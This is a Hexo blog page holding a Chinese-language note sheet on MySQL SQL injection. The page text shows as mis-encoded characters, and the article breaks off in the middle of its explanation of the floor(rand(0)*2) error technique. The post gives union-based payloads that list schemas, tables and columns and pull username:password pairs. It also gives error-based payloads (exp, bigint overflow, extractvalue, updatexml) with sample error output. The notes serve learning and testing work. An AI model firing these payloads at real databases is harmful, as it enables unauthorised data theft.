<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="SQL æ³¨å…¥è¿™æ–¹é¢ä¸€ç›´æŒºèœçš„ï¼Œæ•´ç†ä¸€ä¸‹å§ MySQLUnion Basedåˆ¤æ–­ column æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½® order&#x2F;group by N union select 1,2,3...N   æ³¨æ„ï¼š  è‹¥ç¡®å®šé¡µé¢æœ‰å›æ˜¾ï¼Œä½†æ˜¯é¡µé¢ä¸­å¹¶æ²¡æœ‰æˆ‘ä»¬å®šä¹‰çš„ç‰¹æ®Šæ ‡è®°æ•°å­—å‡ºç°ï¼Œå¯èƒ½æ˜¯é¡µé¢é™åˆ¶äº†å•è¡Œæ•°æ®è¾“å‡ºï¼Œæˆ‘ä»¬è®©å‰è¾¹çš„ select æŸ¥è¯¢æ¡ä»¶è¿”å›ç»“æœä¸ºç©ºå³å¯ æ³¨æ„ä¸€å®šè¦æ‹¼æ¥å¤Ÿè¶³å¤Ÿçš„å­—æ®µæ•°ï¼Œå¦åˆ™ SQL">
<meta property="og:type" content="article">
<meta property="og:title" content="å°è°ˆSQLæ³¨å…¥">
<meta property="og:url" content="http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="Du1">
<meta property="og:description" content="SQL æ³¨å…¥è¿™æ–¹é¢ä¸€ç›´æŒºèœçš„ï¼Œæ•´ç†ä¸€ä¸‹å§ MySQLUnion Basedåˆ¤æ–­ column æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½® order&#x2F;group by N union select 1,2,3...N   æ³¨æ„ï¼š  è‹¥ç¡®å®šé¡µé¢æœ‰å›æ˜¾ï¼Œä½†æ˜¯é¡µé¢ä¸­å¹¶æ²¡æœ‰æˆ‘ä»¬å®šä¹‰çš„ç‰¹æ®Šæ ‡è®°æ•°å­—å‡ºç°ï¼Œå¯èƒ½æ˜¯é¡µé¢é™åˆ¶äº†å•è¡Œæ•°æ®è¾“å‡ºï¼Œæˆ‘ä»¬è®©å‰è¾¹çš„ select æŸ¥è¯¢æ¡ä»¶è¿”å›ç»“æœä¸ºç©ºå³å¯ æ³¨æ„ä¸€å®šè¦æ‹¼æ¥å¤Ÿè¶³å¤Ÿçš„å­—æ®µæ•°ï¼Œå¦åˆ™ SQL">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2021/04/26/zfHIm7y31G5MsZU.png">
<meta property="og:image" content="https://i.loli.net/2021/04/26/R6EMWit5lazIePC.png">
<meta property="og:image" content="https://i.loli.net/2021/04/26/UCKcN46HYWITbBu.png">
<meta property="og:image" content="https://i.loli.net/2021/04/26/XhTW5evptx8EHnC.png">
<meta property="og:image" content="https://i.loli.net/2021/04/26/AxWCeFVRBES7plz.png">
<meta property="article:published_time" content="2021-04-26T05:52:52.000Z">
<meta property="article:modified_time" content="2021-04-26T11:22:01.969Z">
<meta property="article:author" content="Du1">
<meta property="article:tag" content="SQL">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/04/26/zfHIm7y31G5MsZU.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>å°è°ˆSQLæ³¨å…¥</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">links</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post " href="/2021/04/25/SSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&text=å°è°ˆSQLæ³¨å…¥"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=å°è°ˆSQLæ³¨å…¥"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&is_video=false&description=å°è°ˆSQLæ³¨å…¥"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=å°è°ˆSQLæ³¨å…¥&body=Check out this article: http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=å°è°ˆSQLæ³¨å…¥"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=å°è°ˆSQLæ³¨å…¥"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=å°è°ˆSQLæ³¨å…¥"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=å°è°ˆSQLæ³¨å…¥"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&name=å°è°ˆSQLæ³¨å…¥&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&t=å°è°ˆSQLæ³¨å…¥"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL"><span class="toc-number">1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Union-Based"><span class="toc-number">1.1.</span> <span class="toc-text">Union Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD-column-%E6%95%B0%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%95%B0%E6%8D%AE%E5%AD%97%E6%AE%B5%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">åˆ¤æ–­ column æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½®</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%BA%93%E3%80%81%E8%A1%A8%E3%80%81%E5%AD%97%E6%AE%B5"><span class="toc-number">1.1.2.</span> <span class="toc-text">çˆ†åº“ã€è¡¨ã€å­—æ®µ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Error-Based"><span class="toc-number">1.2.</span> <span class="toc-text">Error Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-overflow"><span class="toc-number">1.2.1.</span> <span class="toc-text">åˆ©ç”¨ overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bigint-%E6%95%B0%E5%80%BC%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">bigint æ•°å€¼æ“ä½œ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-xpath"><span class="toc-number">1.2.2.</span> <span class="toc-text">åˆ©ç”¨ xpath</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B632%E4%BD%8D"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">extractvalue (é•¿åº¦é™åˆ¶32ä½)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B632%E4%BD%8D"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">updatexml (é•¿åº¦é™åˆ¶32ä½)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E8%A1%A8%E6%8A%A5%E9%94%99-%E4%B8%BB%E9%94%AE%E9%87%8D%E5%A4%8D"><span class="toc-number">1.2.3.</span> <span class="toc-text">åˆ©ç”¨è™šæ‹Ÿè¡¨æŠ¥é”™ &#x2F; ä¸»é”®é‡å¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%87%A0%E4%BD%95%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.4.</span> <span class="toc-text">åˆ©ç”¨å‡ ä½•å‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.5.</span> <span class="toc-text">åˆ©ç”¨ä¸å­˜åœ¨çš„å‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-name-const"><span class="toc-number">1.2.6.</span> <span class="toc-text">åˆ©ç”¨ name_const</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#uuid-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.7.</span> <span class="toc-text">uuid ç›¸å…³å‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GTID-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.8.</span> <span class="toc-text">GTID ç›¸å…³å‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#join-using-%E6%B3%A8%E5%88%97%E5%90%8D"><span class="toc-number">1.2.9.</span> <span class="toc-text">join using æ³¨åˆ—å</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ST-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.10.</span> <span class="toc-text">ST ç›¸å…³å‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="toc-number">1.2.11.</span> <span class="toc-text">æŠ¥é”™å‡½æ•°é€ŸæŸ¥è¡¨</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        å°è°ˆSQLæ³¨å…¥
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Du1</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-04-26T05:52:52.000Z" itemprop="datePublished">2021-04-26</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/SQL/" rel="tag">SQL</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>SQL æ³¨å…¥è¿™æ–¹é¢ä¸€ç›´æŒºèœçš„ï¼Œæ•´ç†ä¸€ä¸‹å§</p>
<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="Union-Based"><a href="#Union-Based" class="headerlink" title="Union Based"></a>Union Based</h2><h3 id="åˆ¤æ–­-column-æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½®"><a href="#åˆ¤æ–­-column-æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½®" class="headerlink" title="åˆ¤æ–­ column æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½®"></a>åˆ¤æ–­ column æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½®</h3><ul>
<li><code>order/group by N</code></li>
<li><code>union select 1,2,3...N</code></li>
</ul>
<hr>
<p>æ³¨æ„ï¼š</p>
<ul>
<li>è‹¥ç¡®å®šé¡µé¢æœ‰å›æ˜¾ï¼Œä½†æ˜¯é¡µé¢ä¸­å¹¶æ²¡æœ‰æˆ‘ä»¬å®šä¹‰çš„ç‰¹æ®Šæ ‡è®°æ•°å­—å‡ºç°ï¼Œå¯èƒ½æ˜¯é¡µé¢é™åˆ¶äº†å•è¡Œæ•°æ®è¾“å‡ºï¼Œæˆ‘ä»¬è®©å‰è¾¹çš„ select æŸ¥è¯¢æ¡ä»¶è¿”å›ç»“æœä¸ºç©ºå³å¯</li>
<li>æ³¨æ„ä¸€å®šè¦æ‹¼æ¥å¤Ÿè¶³å¤Ÿçš„å­—æ®µæ•°ï¼Œå¦åˆ™ SQL è¯­å¥æŠ¥é”™ã€‚PSï¼šæ­¤æ–¹æ³•ä¹Ÿå¯ä½œä¸ºåˆ¤æ–­å‰æ¡ select è¯­å¥çš„æ–¹æ³•ä¹‹ä¸€</li>
</ul>
<hr>
<h3 id="çˆ†åº“ã€è¡¨ã€å­—æ®µ"><a href="#çˆ†åº“ã€è¡¨ã€å­—æ®µ" class="headerlink" title="çˆ†åº“ã€è¡¨ã€å­—æ®µ"></a>çˆ†åº“ã€è¡¨ã€å­—æ®µ</h3><ul>
<li><p>MySQL version &lt; 5.0</p>
<ul>
<li><p>ç”±äº MySQL çš„ä½ç‰ˆæœ¬ç¼ºä¹ç³»ç»Ÿåº“<code>information_schema</code>ï¼Œæ•…é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥æŸ¥è¯¢è¡¨åï¼Œå­—æ®µï¼ˆåˆ—ï¼‰åç­‰ä¿¡æ¯</p>
<p>è¿™æ—¶å€™åªèƒ½é çŒœæ¥è§£å†³ï¼Œç›´æ¥çŒœè¡¨åä¸åˆ—åæ˜¯ä»€ä¹ˆï¼Œç”šè‡³æ˜¯åº“åï¼Œå†ä½¿ç”¨è”åˆæŸ¥è¯¢å–æ•°æ®</p>
<p>è‹¥çŸ¥é“ä»…è¡¨åè€Œä¸çŸ¥é“åˆ—ï¼ˆå­—æ®µï¼‰åï¼Œå¯ä»¥å°è¯•ï¼š</p>
<ul>
<li><p>å•å­—æ®µï¼š<code>select *,1,2,xxx from table_name</code></p>
</li>
<li><p>å¤šå­—æ®µï¼š<code>select x from(select 1,2,3,4,xxx from table_name union select * from table_name)a</code></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>MySQL version &gt;= 5.0</p>
<ul>
<li><p>çˆ† schema</p>
<ul>
<li><code>union select 1,2,schema_name from information_schema.schemata limit 1,1</code></li>
</ul>
</li>
<li><p>çˆ† table</p>
<ul>
<li><p><code>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</code></p>
</li>
<li><p><code>union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1</code></p>
</li>
</ul>
</li>
<li><p>çˆ† column</p>
<ul>
<li><code>union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;Du1&#39;</code></li>
<li><code>union select 1,2,column_name from information_schema.columns where table_schema=database() limit 0,1</code></li>
</ul>
</li>
<li><p>å‡º</p>
<ul>
<li><code>select heart from Du1</code></li>
<li><code>SELECT CONCAT(username, &quot;:&quot; ,password) FROM Du1.USER</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h2><p>é€šè¿‡ç‰¹æ®Šå‡½æ•°çš„æŠ¥é”™ä½¿å…¶å‚æ•°è¢«é¡µé¢è¾“å‡º</p>
<hr>
<p>å‰æï¼š</p>
<ul>
<li>æœåŠ¡å™¨å¼€å¯æŠ¥é”™ä¿¡æ¯è¿”å›ï¼Œä¹Ÿå°±æ˜¯å‘ç”Ÿé”™è¯¯æ—¶è¿”å›æŠ¥é”™ä¿¡æ¯</li>
</ul>
<p>æ³¨æ„ï¼š</p>
<ul>
<li>æŠ¥é”™å‡½æ•°é€šå¸¸æœ‰æœ€é•¿æŠ¥é”™è¾“å‡ºçš„é™åˆ¶ï¼Œé¢å¯¹è¿™ç§æƒ…å†µï¼Œå¯ä»¥è¿›è¡Œåˆ†å‰²è¾“å‡º<ul>
<li><code>#define ERRMSGSIZE (512)</code></li>
</ul>
</li>
<li>ç‰¹æ®Šå‡½æ•°çš„ç‰¹æ®Šå‚æ•°è¿›è¿è¡Œä¸€ä¸ªå­—æ®µã€ä¸€è¡Œæ•°æ®çš„è¿”å›ï¼Œä½¿ç”¨ group_concat ç­‰å‡½æ•°èšåˆæ•°æ®å³å¯</li>
</ul>
<hr>
<h3 id="åˆ©ç”¨-overflow"><a href="#åˆ©ç”¨-overflow" class="headerlink" title="åˆ©ç”¨ overflow"></a>åˆ©ç”¨ overflow</h3><p>æ³¨ï¼šMySQL version &gt; 5.5.5 çš„æ—¶å€™ overflow æ‰ä¼šæœ‰é”™è¯¯è®¯æ¯ï¼ŒMySQL version &gt; 5.5.53 çš„æ—¶å€™ä¸ä¼šæ˜¾ç¤ºæŸ¥è¯¢ç»“æœ</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>é€‚ç”¨ç‰ˆæœ¬ï¼š5.5.49~5.5.5</p>
<p>è¯¥å‡½æ•°ä¼šè¿”å› e çš„ x æ¬¡æ–¹ç»“æœ</p>
<p>å› ä¸º MySQL èƒ½è®°å½•çš„ double æ•°å€¼èŒƒå›´æœ‰é™ï¼Œä¸€æ—¦ç»“æœè¶…è¿‡èŒƒå›´ï¼Œåˆ™è¯¥å‡½æ•°æŠ¥é”™</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT exp(709) &#x3D;&gt; 8.218407461554972e307<br>SELECT exp(710) &#x3D;&gt; ERROR<br></code></pre></td></tr></table></figure>

<p>æ•…å¯ä½œ payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT exp(~(SELECT * FROM (SELECT user())x));<br>ERROR 1690(22003): DOUBLE value is out of range in &#39;exp(~((SELECT &#39;root@localhost&#39; FROM dual)))&#39;<br></code></pre></td></tr></table></figure>

<p>æŒ‰ç†æ¥è¯´ <code>pow</code> åº”è¯¥ä¹Ÿå¯ä»¥ï¼ŒåŸç†ç›¸åŒ</p>
<hr>
<h4 id="bigint-æ•°å€¼æ“ä½œ"><a href="#bigint-æ•°å€¼æ“ä½œ" class="headerlink" title="bigint æ•°å€¼æ“ä½œ"></a>bigint æ•°å€¼æ“ä½œ</h4><p>åˆ©ç”¨äº†å½“ MySQL æ•°æ®åº“çš„æŸäº›è¾¹ç•Œæ•°å€¼è¿›è¡Œæ•°å€¼è¿ç®—æ—¶ï¼Œä¼šæŠ¥é”™çš„åŸç†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT ~0 &#x3D;&gt; 18446744073709551615<br>SELECT ~0 + 1 &#x3D;&gt; ERROR<br>SELECT cot(0) &#x3D;&gt; ERROR<br><br>select !(select * from(select user())a)-~0;<br>select (select(!x-~0)from(select(select user())x)a);<br>ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#39;root@localhost&#39;)) - ~(0))&#39;<br></code></pre></td></tr></table></figure>

<h3 id="åˆ©ç”¨-xpath"><a href="#åˆ©ç”¨-xpath" class="headerlink" title="åˆ©ç”¨ xpath"></a>åˆ©ç”¨ xpath</h3><h4 id="extractvalue-é•¿åº¦é™åˆ¶32ä½"><a href="#extractvalue-é•¿åº¦é™åˆ¶32ä½" class="headerlink" title="extractvalue (é•¿åº¦é™åˆ¶32ä½)"></a>extractvalue (é•¿åº¦é™åˆ¶32ä½)</h4><p>åŸç†ï¼šå‰åæ·»åŠ  ~ ä½¿å…¶ä¸ç¬¦åˆ xpath æ ¼å¼ä»è€ŒæŠ¥é”™</p>
<p>é€‚ç”¨ç‰ˆæœ¬ 5.1.5+</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select extractvalue(1,concat(0x7e,(select @@version),0x7e));<br>ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;<br></code></pre></td></tr></table></figure>

<h4 id="updatexml-é•¿åº¦é™åˆ¶32ä½"><a href="#updatexml-é•¿åº¦é™åˆ¶32ä½" class="headerlink" title="updatexml (é•¿åº¦é™åˆ¶32ä½)"></a>updatexml (é•¿åº¦é™åˆ¶32ä½)</h4><p>é€‚ç”¨ç‰ˆæœ¬ 5.1.5+</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select updatexml(1,concat(0x7e,(select @@version),0x7e),1);<br>ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;<br></code></pre></td></tr></table></figure>

<h3 id="åˆ©ç”¨è™šæ‹Ÿè¡¨æŠ¥é”™-ä¸»é”®é‡å¤"><a href="#åˆ©ç”¨è™šæ‹Ÿè¡¨æŠ¥é”™-ä¸»é”®é‡å¤" class="headerlink" title="åˆ©ç”¨è™šæ‹Ÿè¡¨æŠ¥é”™ / ä¸»é”®é‡å¤"></a>åˆ©ç”¨è™šæ‹Ÿè¡¨æŠ¥é”™ / ä¸»é”®é‡å¤</h3><p>åŸç†ï¼šç®€å•æ¥è¯´ï¼Œæ˜¯ç”±äº where æ¡ä»¶æ¯æ‰§è¡Œä¸€æ¬¡ï¼Œrand å‡½æ•°å°±ä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œå¦‚æœåœ¨ç”±äºåœ¨ç»Ÿè®¡æ•°æ®æ—¶åˆ¤æ–­ä¾æ®ä¸èƒ½åŠ¨æ€æ”¹å˜ï¼Œæ•… <code>rand()</code> ä¸èƒ½åæ¥åœ¨<code>order/group by</code> ä¸Š</p>
<hr>
<p>ä¸¾æ —å­ï¼š</p>
<p>å‡è®¾ USER è¡¨æœ‰ä¸‰æ¡æ•°æ®ï¼Œæˆ‘ä»¬é€šè¿‡ï¼š<code>select * from USER group by username</code> æ¥é€šè¿‡å…¶ä¸­çš„ username å­—æ®µè¿›è¡Œåˆ†ç»„</p>
<p>æ­¤è¿‡ç¨‹ä¼šå…ˆå»ºç«‹ä¸€ä¸ªè™šæ‹Ÿè¡¨ï¼Œå­˜åœ¨ä¸¤ä¸ªå­—æ®µï¼š<code>keyï¼Œcount</code></p>
<p>å…¶ä¸­æˆ‘ä»¬é€šè¿‡ username æ¥åˆ¤æ–­ï¼Œå…¶åœ¨æ­¤å¤„æ˜¯å­—æ®µï¼Œé¦–å…ˆå…ˆå–ç¬¬ä¸€è¡Œçš„æ•°æ®ï¼š<code>username=Du1&amp;password=0312</code></p>
<p>username ä¸º Du1 å‡ºç°ä¸€æ¬¡ï¼Œåˆ™ç°åœ¨è™šè¡¨å†…æŸ¥è¯¢æ˜¯å¦å­˜åœ¨ Du1ï¼Œè‹¥å­˜åœ¨ï¼Œåˆ™ count + 1ï¼Œè‹¥ä¸å­˜åœ¨ï¼Œåˆ™æ·»åŠ  Du1ï¼Œå…¶ count ä¸º 1</p>
<p>å¯¹äº<code>floor(rand(0)*2)</code>ï¼Œå…¶ä¸­<code>rand()</code>å‡½æ•°ï¼Œä¼šç”Ÿæˆ 0 ~ 1 ä¹‹é—´éšæœºä¸€ä¸ªå°æ•°ã€<code>floor()</code>å–æ•´æ•°éƒ¨åˆ†ã€0 æ˜¯éšæœºå› å­ã€ä¹˜ 2 æ˜¯ä¸ºäº†è®©å¤§äº 0.5 çš„å°æ•°é€šè¿‡ floor å‡½æ•°å¾— 1</p>
<p>è‹¥è¡¨ä¸­æœ‰ä¸‰è¡Œæ•°æ®ï¼šæˆ‘ä»¬é€šè¿‡<code>select * from USER group by floor(rand(0)*2)</code>è¿›è¡Œæ’åºçš„è¯</p>
<blockquote>
<p>æ³¨æ„ï¼š</p>
<p>ç”±äº<code>rand(0)</code>çš„éšæœºå› å­æ˜¯è¢«å›ºå®šçš„ï¼Œæ•…å…¶äº§ç”Ÿçš„éšæœºæ•°ä¹Ÿè¢«å›ºå®šäº†ï¼Œé¡ºåºä¸ºï¼š011011â€¦â€¦</p>
</blockquote>
<p>é¦–å…ˆ<code>group by</code>éœ€è¦æ‰§è¡Œçš„è¯ï¼Œéœ€è¦ç¡®å®šåˆ†ç»„å› å­ï¼Œæ•…<code>floor(rand(0)*2)</code>è¢«æ‰§è¡Œä¸€æ¬¡ï¼Œå¾—åˆ°çš„ç»“æœä¸º 0ï¼Œæ¥ç€åœ¨è™šè¡¨å†…æ£€ç´¢ 0ï¼Œå‘ç°è™šè¡¨æ²¡æœ‰é”®å€¼ä¸º 0 çš„è®°å½•ï¼Œæ•…æ·»åŠ ä¸Šï¼Œåœ¨è¿›è¡Œæ·»åŠ æ—¶ï¼š<code>floor(rand(0)*2)</code>ç¬¬äºŒæ¬¡è¢«æ‰§è¡Œï¼Œå¾—åˆ°ç»“æœ 1ï¼Œäºæ˜¯è™šæ‹Ÿè¡¨æ’å…¥çš„å†…å®¹ä¸º<code>key=1&amp;count=1</code></p>
<p>ç¬¬äºŒæ¬¡æ‰§è¡Œ<code>group by</code>æ—¶ï¼š<code>floor(rand(0)*2)</code>å…ˆè¢«è¿è¡Œä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸‰æ¬¡è¿è¡Œã€‚å¾—åˆ°ç»“æœ 1ï¼ŒæŸ¥è¯¢è™šè¡¨å‘ç°æ•°æ®å­˜åœ¨ï¼Œå› è€Œç›´æ¥è®©è™šè¡¨å†…çš„<code>key=1</code>çš„ count åŠ ä¸€å³å¯ï¼Œ<code>floor(..)</code>åªè¿è¡Œäº†ä¸€æ¬¡</p>
